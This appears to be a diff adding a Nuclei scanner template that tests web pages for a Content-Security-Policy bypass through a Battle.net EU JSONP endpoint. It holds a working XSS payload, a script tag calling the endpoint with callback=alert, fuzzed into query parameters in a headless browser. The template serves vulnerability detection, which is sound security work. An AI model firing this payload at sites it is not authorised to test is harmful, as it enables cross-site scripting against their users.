@@ -1,0 +1,55 @@
+id: battlenet-eu-csp-bypass
+
+info:
+  name: Content-Security-Policy Bypass - Battle.net EU
+  author: renniepak,DhiyaneshDK
+  severity: medium
+  reference:
+    - https://github.com/renniepak/CSPBypass/blob/main/data.tsv
+  metadata:
+    verified: true
+  tags: xss,csp-bypass,battlenet-eu
+
+flow: http(1) && headless(1)
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+
+    matchers:
+      - type: word
+        part: header
+        words:
+          - "Content-Security-Policy"
+          - "battle.net"
+        condition: and
+        internal: true
+
+headless:
+  - steps:
+      - action: navigate
+        args:
+          url: "{{BaseURL}}"
+
+      - action: waitdialog
+        name: battlenet_eu_csp_xss
+        args:
+          max-duration: 5s
+
+    payloads:
+      injection:
+        - '<script src="https://eu.battle.net/support/update/json?callback=alert"></script>'
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{url_encode(injection)}}"
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "battlenet_eu_csp_xss == true"
+# digest: 4a0a00473045022100e840702ad8be1c00571b2b5894d06180d213bde44edd00f12e1994eb17a4052c02204a6825190f2c571724097c1afea1d7bb6a4193bd5cf053c680aa0b3a11282360:922c64590222798bb761d5b6d8e72950
